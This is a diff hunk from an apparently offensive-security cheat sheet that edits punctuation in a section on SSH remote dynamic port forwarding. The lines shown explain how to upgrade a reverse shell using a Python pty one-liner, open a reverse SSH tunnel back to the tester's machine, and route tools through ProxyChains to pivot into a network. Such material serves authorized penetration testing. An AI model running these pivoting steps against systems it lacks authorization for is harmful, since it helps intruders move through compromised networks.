@@ -3667,7 +3667,7 @@ See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/aca
 #### SSH Remote Dynamic Port Forwarding
 1. On the reverse shell, run `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `ssh -N -R <PORT> [username@address]`
    - `[username@address]` of your local ssh
-2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy (`socks5  127.0.0.1 <PORT>`).
+2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  127.0.0.1 <PORT>`
 3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
 
 
